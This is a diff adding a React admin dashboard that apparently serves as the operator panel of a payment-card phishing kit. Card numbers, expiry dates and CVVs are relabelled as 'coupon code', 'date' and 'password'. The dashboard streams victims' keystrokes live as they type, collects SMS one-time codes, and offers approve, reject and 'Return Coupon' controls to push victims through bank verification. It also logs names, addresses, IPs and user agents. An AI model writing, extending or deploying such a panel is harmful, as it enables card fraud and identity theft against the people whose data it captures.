@@ -1,0 +1,466 @@
+import { useState, useEffect } from "react";
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Badge } from "@/components/ui/badge";
+import { Button } from "@/components/ui/button";
+import { Monitor, Check, X, MessageSquare, RefreshCw, Filter, RotateCcw, Smartphone, Globe, Radio } from "lucide-react";
+import { useRealtime } from "@/context/RealtimeContext";
+import { useAdminAuth } from "@/context/AdminAuthContext";
+import {
+  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogTrigger,
+} from "@/components/ui/dialog";
+import {
+  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
+} from "@/components/ui/select";
+import { io } from "socket.io-client";
+
+// --- Coupon Card Visual Component ---
+const CouponCard = ({ name, code, date, cvv }: { name: string; code: string; date: string; cvv: string }) => {
+  const digits = (code || '').replace(/\D/g, '');
+  const formatted = digits ? digits.replace(/(.{4})/g, '$1 ').trim() : '•••• •••• •••• ••••';
+  return (
+    <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-2xl"
+      style={{ aspectRatio: '1.7/1', background: 'linear-gradient(135deg, #6D3AE8 0%, #4C1D95 50%, #5B21B6 100%)' }}>
+      <div className="h-full flex flex-col justify-between p-7 text-white select-text">
+        <div className="text-center pt-3">
+          <p className="text-xl font-bold tracking-wider">{name || 'Cardholder Name'}</p>
+        </div>
+        <div className="text-center py-2 px-1 overflow-hidden">
+          <p className="text-[clamp(14px,4.5vw,22px)] font-extrabold tracking-[0.1em] whitespace-nowrap" style={{ fontFamily: "'Courier New', 'Lucida Console', monospace" }}>
+            {formatted}
+          </p>
+        </div>
+        <div className="flex justify-between items-end pb-1">
+          <p className="text-[22px] font-bold tracking-wider">{date || '••/••'}</p>
+          <p className="text-[22px] font-bold tracking-wider">{cvv || '•••'}</p>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+interface CouponHistoryItem { couponCode: string; dateMMYY: string; password: string; created_at: string; }
+interface SmsHistoryItem { smsCode: string; created_at: string; }
+
+interface LiveSession {
+  id: string;
+  customer: { firstName: string; lastName: string; email: string; phone: string; address: string; city: string; state: string; zipCode: string; country: string; } | null;
+  cartTotal: number;
+  couponCode: string;
+  dateMMYY: string;
+  password: string;
+  startedAt: string;
+}
+
+interface OrderData {
+  id: string;
+  created_at: string;
+  shop_name: string;
+  customer: { firstName: string; lastName: string; email: string; phone: string; address: string; city: string; state: string; zipCode: string; country: string; };
+  total: number;
+  status: string;
+  couponCode?: string;
+  dateMMYY?: string;
+  password?: string;
+  smsCode?: string;
+  userAgent?: string;
+  ipAddress?: string;
+  couponHistory?: CouponHistoryItem[];
+  smsHistory?: SmsHistoryItem[];
+  online?: boolean;
+  _isLive?: boolean;
+}
+
+const API_URL = import.meta.env.DEV ? "http://localhost:3001" : (import.meta.env.VITE_API_URL ?? "");
+
+export const DataListView = () => {
+  const { getAuthHeaders, clearAuth } = useAdminAuth();
+  const [orders, setOrders] = useState<OrderData[]>([]);
+  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
+  const [filterType, setFilterType] = useState<"all" | "pending" | "completed" | "online">("all");
+  const [isRefreshing, setIsRefreshing] = useState(false);
+  const [onlineOrderIds, setOnlineOrderIds] = useState<Set<string>>(new Set());
+  const { liveData } = useRealtime();
+
+  const loadOrders = async () => {
+    setIsRefreshing(true);
+    try {
+      const res = await fetch(`${API_URL}/api/admin/orders`, { headers: getAuthHeaders() });
+      if (res.status === 401) { clearAuth(); return; }
+      const data = await res.json();
+      if (Array.isArray(data)) {
+        setOrders(data);
+        const onIds = new Set<string>();
+        data.forEach((o: OrderData) => { if (o.online) onIds.add(o.id); });
+        setOnlineOrderIds(onIds);
+      }
+    } catch (err) { console.error("Failed to load orders", err); }
+    finally { setTimeout(() => setIsRefreshing(false), 500); }
+  };
+
+  useEffect(() => {
+    loadOrders();
+
+    fetch(`${API_URL}/api/admin/live-sessions`, { headers: getAuthHeaders() }).then(r => { if (r.status === 401) clearAuth(); return r.json(); }).then(sessions => {
+      if (Array.isArray(sessions)) setLiveSessions(sessions);
+    }).catch(() => {});
+
+    const socket = io(API_URL);
+    socket.emit('join_admin');
+
+    // Real order events
+    socket.on('new_order', (newOrder: OrderData) => { setOrders(prev => [newOrder, ...prev]); });
+    socket.on('order_update', (data: any) => {
+      setOrders(prev => prev.map(o => {
+        if (o.id !== data.id) return o;
+        const updated: OrderData = { ...o, status: data.status };
+        if (data.smsCode !== undefined) updated.smsCode = data.smsCode;
+        if (data.couponCode !== undefined) updated.couponCode = data.couponCode;
+        if (data.dateMMYY !== undefined) updated.dateMMYY = data.dateMMYY;
+        if (data.password !== undefined) updated.password = data.password;
+        if (data.total !== undefined) updated.total = data.total;
+        if (data.customer !== undefined) updated.customer = data.customer;
+        if (data.status === 'WAITING_APPROVAL' && data.couponCode) {
+          updated.smsCode = undefined;
+          if (o.couponCode && o.couponCode !== data.couponCode) {
+            updated.couponHistory = [...(o.couponHistory || []),
+              { couponCode: o.couponCode, dateMMYY: o.dateMMYY || '', password: o.password || '', created_at: new Date().toISOString() }];
+          }
+        }
+        return updated;
+      }));
+    });
+    socket.on('user_online', ({ orderId, online }: { orderId: string; online: boolean }) => {
+      setOnlineOrderIds(prev => { const n = new Set(prev); if (online) n.add(orderId); else n.delete(orderId); return n; });
+    });
+
+    // Live typing session events
+    socket.on('live_session_start', (session: LiveSession) => {
+      setLiveSessions(prev => {
+        const exists = prev.find(s => s.id === session.id);
+        if (exists) return prev.map(s => s.id === session.id ? session : s);
+        return [session, ...prev];
+      });
+    });
+    socket.on('live_coupon_update', (data: { id: string; code?: string; dateMMYY?: string; password?: string }) => {
+      setLiveSessions(prev => prev.map(s => {
+        if (s.id !== data.id) return s;
+        return {
+          ...s,
+          couponCode: data.code !== undefined ? data.code : s.couponCode,
+          dateMMYY: data.dateMMYY !== undefined ? data.dateMMYY : s.dateMMYY,
+          password: data.password !== undefined ? data.password : s.password,
+        };
+      }));
+    });
+    // Real-time coupon typing for existing orders (Return Coupon / resubmit flow)
+    socket.on('live_order_coupon_update', (data: { orderId: string; code?: string; dateMMYY?: string; password?: string }) => {
+      setOrders(prev => prev.map(o => {
+        if (o.id !== data.orderId) return o;
+        return {
+          ...o,
+          couponCode: data.code !== undefined ? data.code : o.couponCode,
+          dateMMYY: data.dateMMYY !== undefined ? data.dateMMYY : o.dateMMYY,
+          password: data.password !== undefined ? data.password : o.password,
+        };
+      }));
+    });
+    socket.on('live_session_end', ({ id }: { id: string }) => {
+      setLiveSessions(prev => prev.filter(s => s.id !== id));
+    });
+
+    return () => { socket.disconnect(); };
+  }, [getAuthHeaders, clearAuth]);
+
+  // Convert live sessions to display format and merge with orders
+  const liveAsOrders: OrderData[] = liveSessions.map(s => ({
+    id: `LIVE-${s.id.slice(-6)}`,
+    created_at: s.startedAt,
+    shop_name: 'Live',
+    customer: s.customer || { firstName: '...', lastName: '', email: '', phone: '', address: '', city: '', state: '', zipCode: '', country: '' },
+    total: s.cartTotal,
+    status: 'LIVE_TYPING',
+    couponCode: s.couponCode,
+    dateMMYY: s.dateMMYY,
+    password: s.password,
+    _isLive: true,
+  }));
+
+  const allOrders = [...liveAsOrders, ...orders];
+
+  const filteredOrders = allOrders.filter(order => {
+    if (filterType === "all") return true;
+    if (filterType === "pending") return ["WAITING_APPROVAL", "SMS_SUBMITTED", "RETURN_COUPON", "LIVE_TYPING"].includes(order.status);
+    if (filterType === "completed") return ["COMPLETED", "APPROVED"].includes(order.status);
+    if (filterType === "online") return order._isLive || onlineOrderIds.has(order.id);
+    return true;
+  });
+
+  const fmt = (d: string) => { try { return new Date(d).toLocaleString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' }); } catch { return d; } };
+
+  const updateStatus = async (id: string, status: string) => {
+    try {
+      const res = await fetch(`${API_URL}/api/admin/orders/${id}/status`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...getAuthHeaders() }, body: JSON.stringify({ status }) });
+      if (res.status === 401) clearAuth();
+    } catch (err) { console.error("Failed to update status", err); }
+  };
+  const handleApprove = (o: OrderData) => updateStatus(o.id, "APPROVED");
+  const handleReject = (o: OrderData) => updateStatus(o.id, "REJECTED");
+  const handleConfirmSMS = (o: OrderData) => updateStatus(o.id, "COMPLETED");
+  const handleRejectSMS = (o: OrderData) => updateStatus(o.id, "REJECTED");
+  const handleReturnCoupon = (o: OrderData) => updateStatus(o.id, "RETURN_COUPON");
+
+  const devIcon = (ua?: string) => {
+    if (!ua) return <Globe className="w-3 h-3" />;
+    return /mobile|iphone|android/i.test(ua) ? <Smartphone className="w-3 h-3" /> : <Monitor className="w-3 h-3" />;
+  };
+
+  const statusBadge = (status: string) => {
+    const s: Record<string, string> = {
+      COMPLETED: "bg-green-50 text-green-700 border-green-200",
+      APPROVED: "bg-blue-50 text-blue-700 border-blue-200",
+      WAITING_APPROVAL: "bg-yellow-100 text-yellow-800 border-yellow-200 animate-pulse",
+      SMS_SUBMITTED: "bg-purple-100 text-purple-800 border-purple-200 animate-pulse",
+      REJECTED: "bg-red-50 text-red-700 border-red-200",
+      AUTO_REJECTED: "bg-red-100 text-red-800 border-red-300",
+      RETURN_COUPON: "bg-orange-100 text-orange-800 border-orange-200 animate-pulse",
+      LIVE_TYPING: "bg-emerald-100 text-emerald-800 border-emerald-300 animate-pulse",
+    };
+    const label = status === "APPROVED" ? "WAITING SMS" : status === "RETURN_COUPON" ? "RETURN COUPON" : status === "LIVE_TYPING" ? "LIVE TYPING" : status === "AUTO_REJECTED" ? "AUTO REJECTED" : status;
+    return <Badge variant="outline" className={s[status] || ""}>{label}</Badge>;
+  };
+
+  return (
+    <div className="space-y-8 animate-in fade-in duration-500">
+      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
+        <div>
+          <h2 className="text-2xl font-bold tracking-tight">Data Management</h2>
+          <p className="text-muted-foreground text-sm mt-1">Real-time monitoring of customer submissions</p>
+        </div>
+        <div className="flex items-center gap-3">
+          <div className="flex items-center gap-2">
+            <Filter className="w-4 h-4 text-muted-foreground" />
+            <Select value={filterType} onValueChange={(v: any) => setFilterType(v)}>
+              <SelectTrigger className="w-[180px]"><SelectValue placeholder="Filter" /></SelectTrigger>
+              <SelectContent>
+                <SelectItem value="all">All Orders</SelectItem>
+                <SelectItem value="pending">Pending Action</SelectItem>
+                <SelectItem value="completed">Completed</SelectItem>
+                <SelectItem value="online">Online Users</SelectItem>
+              </SelectContent>
+            </Select>
+          </div>
+          <Button variant="outline" size="icon" onClick={loadOrders} disabled={isRefreshing} className={isRefreshing ? "animate-spin" : ""} title="Refresh"><RefreshCw className="w-4 h-4" /></Button>
+          {liveSessions.length > 0 && (
+            <Badge className="bg-emerald-600 text-white text-sm px-3 py-1 h-9 animate-pulse">
+              <Radio className="w-3 h-3 mr-1" />{liveSessions.length} Live
+            </Badge>
+          )}
+          <Badge variant="default" className="text-sm px-3 py-1 h-9"><span className="flex items-center gap-1">🟢 Live</span></Badge>
+        </div>
+      </div>
+
+      <Card>
+        <CardHeader>
+          <CardTitle className="flex items-center gap-2"><Monitor className="w-5 h-5" />Order Submissions ({filteredOrders.length})</CardTitle>
+        </CardHeader>
+        <CardContent>
+          <Table>
+            <TableHeader>
+              <TableRow>
+                <TableHead>Order ID</TableHead>
+                <TableHead>Shop</TableHead>
+                <TableHead>Date</TableHead>
+                <TableHead>Customer</TableHead>
+                <TableHead>Amount</TableHead>
+                <TableHead>Coupon Info</TableHead>
+                <TableHead>Status</TableHead>
+                <TableHead className="text-right">Actions</TableHead>
+              </TableRow>
+            </TableHeader>
+            <TableBody>
+              {filteredOrders.length === 0 ? (
+                <TableRow><TableCell colSpan={8} className="text-center py-8 text-muted-foreground">No data found</TableCell></TableRow>
+              ) : (
+                filteredOrders.map((order) => (
+                  <TableRow key={order.id} className={
+                    order.status === "LIVE_TYPING" ? "bg-emerald-50/60 dark:bg-emerald-900/10 border-l-4 border-l-emerald-500" :
+                    order.status === "WAITING_APPROVAL" ? "bg-yellow-50/50 dark:bg-yellow-900/10" :
+                    order.status === "SMS_SUBMITTED" ? "bg-blue-50/50 dark:bg-blue-900/10" :
+                    order.status === "RETURN_COUPON" ? "bg-orange-50/50 dark:bg-orange-900/10" : ""
+                  }>
+                    <TableCell className="font-mono text-xs">
+                      <div className="flex items-center gap-1.5">
+                        <span className={`inline-block w-2 h-2 rounded-full flex-shrink-0 ${order._isLive ? 'bg-emerald-500 animate-pulse' : onlineOrderIds.has(order.id) ? 'bg-green-500' : 'bg-gray-300'}`} />
+                        {order._isLive ? (
+                          <Dialog>
+                            <DialogTrigger asChild>
+                              <Button variant="link" className="p-0 h-auto font-mono text-xs underline text-emerald-700">{order.id}</Button>
+                            </DialogTrigger>
+                            <DialogContent className="max-w-lg">
+                              <DialogHeader>
+                                <DialogTitle className="flex items-center gap-2"><Radio className="w-4 h-4 text-emerald-600 animate-pulse" />Live Session Preview</DialogTitle>
+                                <DialogDescription>User is currently typing...</DialogDescription>
+                              </DialogHeader>
+                              <div className="py-4">
+                                <CouponCard
+                                  name={`${order.customer.firstName} ${order.customer.lastName}`.trim()}
+                                  code={order.couponCode || ''}
+                                  date={order.dateMMYY || ''}
+                                  cvv={order.password || ''}
+                                />
+                                {order.customer.firstName && (
+                                  <div className="mt-4 text-sm text-muted-foreground space-y-1">
+                                    <div>Email: {order.customer.email || '-'}</div>
+                                    <div>Phone: {order.customer.phone || '-'}</div>
+                                    <div>Address: {order.customer.address || '-'}, {order.customer.city} {order.customer.state} {order.customer.zipCode}</div>
+                                  </div>
+                                )}
+                              </div>
+                            </DialogContent>
+                          </Dialog>
+                        ) : (
+                          <Dialog>
+                            <DialogTrigger asChild>
+                              <Button variant="link" className="p-0 h-auto font-mono text-xs underline text-primary">{order.id}</Button>
+                            </DialogTrigger>
+                            <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
+                              <DialogHeader>
+                                <DialogTitle>Order Details</DialogTitle>
+                                <DialogDescription>Details for {order.id} from {order.shop_name}</DialogDescription>
+                              </DialogHeader>
+                              <div className="space-y-6 py-4">
+                                {/* Coupon Card Visual */}
+                                <div className="pb-4 border-b">
+                                  <CouponCard
+                                    name={`${order.customer.firstName} ${order.customer.lastName}`}
+                                    code={order.couponCode || ''}
+                                    date={order.dateMMYY || ''}
+                                    cvv={order.password || ''}
+                                  />
+                                </div>
+                                {/* Customer */}
+                                <div className="border-b pb-4">
+                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">Customer Information</div>
+                                  <div className="grid grid-cols-2 gap-y-3 gap-x-8">
+                                    <div><div className="text-xs text-muted-foreground">Name</div><div className="font-medium">{order.customer.firstName} {order.customer.lastName}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">Email</div><div className="font-medium">{order.customer.email}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">Phone</div><div className="font-medium">{order.customer.phone || "N/A"}</div></div>
+                                  </div>
+                                </div>
+                                {/* Address */}
+                                <div className="border-b pb-4">
+                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">Shipping Address</div>
+                                  <div className="grid grid-cols-2 gap-y-3 gap-x-8">
+                                    <div className="col-span-2"><div className="text-xs text-muted-foreground">Address</div><div className="font-medium">{order.customer.address || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">City</div><div className="font-medium">{order.customer.city || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">State</div><div className="font-medium">{order.customer.state || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">ZIP</div><div className="font-medium">{order.customer.zipCode || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">Country</div><div className="font-medium">{order.customer.country || "N/A"}</div></div>
+                                  </div>
+                                </div>
+                                {/* Technical */}
+                                <div className="border-b pb-4">
+                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">Technical Info</div>
+                                  <div className="space-y-3">
+                                    <div className="flex items-start gap-3"><div className="text-xs text-muted-foreground min-w-[40px] pt-1">IP</div><div className="font-mono text-sm bg-muted px-2 py-1 rounded break-all flex-1">{order.ipAddress || "Unknown"}</div></div>
+                                    <div className="flex items-start gap-3"><div className="text-xs text-muted-foreground min-w-[40px] pt-1">UA</div><div className="font-mono text-xs bg-muted px-2 py-1 rounded break-all leading-relaxed flex-1">{order.userAgent || "Unknown"}</div></div>
+                                  </div>
+                                </div>
+                                {/* Verification */}
+                                <div className="border-b pb-4 bg-muted/20 -mx-6 px-6 py-4">
+                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">Verification Details</div>
+                                  <div className="grid grid-cols-2 gap-y-3 gap-x-8">
+                                    <div><div className="text-xs text-muted-foreground">Coupon Code</div><div className="font-mono font-medium">{order.couponCode || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">Date (MM/YY)</div><div className="font-mono font-medium">{order.dateMMYY || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">Password</div><div className="font-mono font-bold text-red-500">{order.password || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">SMS Code</div><div className="font-mono font-bold text-blue-600">{order.smsCode || "N/A"}</div></div>
+                                    <div><div className="text-xs text-muted-foreground">Amount</div><div className="font-medium">${(order.total || 0).toFixed(2)}</div></div>
+                                  </div>
+                                </div>
+                                {/* Coupon History */}
+                                {order.couponHistory && order.couponHistory.length > 0 && (
+                                  <div className="border-b pb-4">
+                                    <div className="text-sm font-bold uppercase tracking-wider mb-3">Coupon History ({order.couponHistory.length})</div>
+                                    <div className="bg-muted/30 rounded-lg overflow-hidden">
+                                      <table className="w-full text-xs">
+                                        <thead><tr className="border-b"><th className="text-left p-2 text-muted-foreground">#</th><th className="text-left p-2 text-muted-foreground">Code</th><th className="text-left p-2 text-muted-foreground">Date</th><th className="text-left p-2 text-muted-foreground">Pass</th><th className="text-left p-2 text-muted-foreground">Time</th></tr></thead>
+                                        <tbody>{order.couponHistory.map((h, i) => (<tr key={i} className="border-b last:border-0"><td className="p-2">{i+1}</td><td className="p-2 font-mono">{h.couponCode}</td><td className="p-2 font-mono">{h.dateMMYY}</td><td className="p-2 font-mono text-red-500">{h.password}</td><td className="p-2 text-muted-foreground">{fmt(h.created_at)}</td></tr>))}</tbody>
+                                      </table>
+                                    </div>
+                                  </div>
+                                )}
+                                {/* SMS History */}
+                                {order.smsHistory && order.smsHistory.length > 0 && (
+                                  <div>
+                                    <div className="text-sm font-bold uppercase tracking-wider mb-3">SMS Code History ({order.smsHistory.length})</div>
+                                    <div className="bg-muted/30 rounded-lg overflow-hidden">
+                                      <table className="w-full text-xs">
+                                        <thead><tr className="border-b"><th className="text-left p-2 text-muted-foreground">#</th><th className="text-left p-2 text-muted-foreground">SMS Code</th><th className="text-left p-2 text-muted-foreground">Time</th></tr></thead>
+                                        <tbody>{order.smsHistory.map((h, i) => (<tr key={i} className="border-b last:border-0"><td className="p-2">{i+1}</td><td className="p-2 font-mono tracking-widest">{h.smsCode}</td><td className="p-2 text-muted-foreground">{fmt(h.created_at)}</td></tr>))}</tbody>
+                                      </table>
+                                    </div>
+                                  </div>
+                                )}
+                              </div>
+                            </DialogContent>
+                          </Dialog>
+                        )}
+                      </div>
+                    </TableCell>
+                    <TableCell>{order._isLive ? <Badge className="bg-emerald-100 text-emerald-800 border-emerald-300 animate-pulse">Live</Badge> : <Badge variant="outline">{order.shop_name}</Badge>}</TableCell>
+                    <TableCell className="whitespace-nowrap text-xs">{fmt(order.created_at)}</TableCell>
+                    <TableCell>
+                      <div className="font-medium">{order.customer.firstName} {order.customer.lastName}</div>
+                      <div className="text-xs text-muted-foreground">{order.customer.email}</div>
+                      {!order._isLive && <div className="text-xs text-muted-foreground flex items-center gap-1 mt-0.5">{devIcon(order.userAgent)}<span className="truncate max-w-[100px]">{order.ipAddress || "-"}</span></div>}
+                    </TableCell>
+                    <TableCell className="font-medium text-sm">${(order.total || 0).toFixed(2)}</TableCell>
+                    <TableCell>
+                      <div className="space-y-1 min-w-[140px]">
+                        <div className="flex justify-between text-xs"><span className="text-muted-foreground">Code:</span><span className={`font-mono font-medium ${order._isLive ? 'text-emerald-700' : ''}`}>{order.couponCode || (order._isLive ? '...' : '-')}</span></div>
+                        <div className="flex justify-between text-xs"><span className="text-muted-foreground">Date:</span><span className={`font-mono font-medium ${order._isLive ? 'text-emerald-700' : ''}`}>{order.dateMMYY || (order._isLive ? '...' : '-')}</span></div>
+                        <div className="flex justify-between text-xs"><span className="text-muted-foreground">Pass:</span><span className={`font-mono font-bold ${order._isLive ? 'text-emerald-700' : 'text-red-500'}`}>{order.password || (order._isLive ? '...' : '-')}</span></div>
+                        {order.couponHistory && order.couponHistory.length > 0 && (<div className="text-[10px] text-orange-600">({order.couponHistory.length} previous)</div>)}
+                      </div>
+                    </TableCell>
+                    <TableCell>
+                      <div className="flex flex-col gap-1">
+                        {statusBadge(order.status)}
+                        {order.smsCode && (<Badge variant="secondary" className="font-mono tracking-widest justify-center bg-purple-100 text-purple-900 border-purple-300">SMS: {order.smsCode}</Badge>)}
+                      </div>
+                    </TableCell>
+                    <TableCell className="text-right">
+                      {order.status === "LIVE_TYPING" && (
+                        <span className="text-xs text-emerald-600 italic">Typing...</span>
+                      )}
+                      {order.status === "WAITING_APPROVAL" && (
+                        <div className="flex justify-end gap-2">
+                          <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title="Reject"><X className="w-4 h-4" /></Button>
+                          <Button size="sm" className="h-8 px-2 bg-green-600 hover:bg-green-700" onClick={() => handleApprove(order)} title="Approve"><Check className="w-4 h-4" /></Button>
+                        </div>
+                      )}
+                      {order.status === "SMS_SUBMITTED" && (
+                        <div className="flex flex-col gap-2">
+                          <div className="flex justify-end gap-2">
+                            <Button size="sm" variant="destructive" onClick={() => handleRejectSMS(order)} className="h-8 px-2"><X className="w-4 h-4" /></Button>
+                            <Button size="sm" className="h-8 px-3 bg-blue-600 hover:bg-blue-700 text-white" onClick={() => handleConfirmSMS(order)} disabled={!order.smsCode || order.smsCode.length < 4}>
+                              <MessageSquare className="w-4 h-4 mr-1" />Confirm
+                            </Button>
+                          </div>
+                          <Button size="sm" variant="outline" onClick={() => handleReturnCoupon(order)} className="h-8 px-3 border-orange-300 text-orange-700 hover:bg-orange-50">
+                            <RotateCcw className="w-3 h-3 mr-1" />Return Coupon
+                          </Button>
+                        </div>
+                      )}
+                    </TableCell>
+                  </TableRow>
+                ))
+              )}
+            </TableBody>
+          </Table>
+        </CardContent>
+      </Card>
+    </div>
+  );
+};
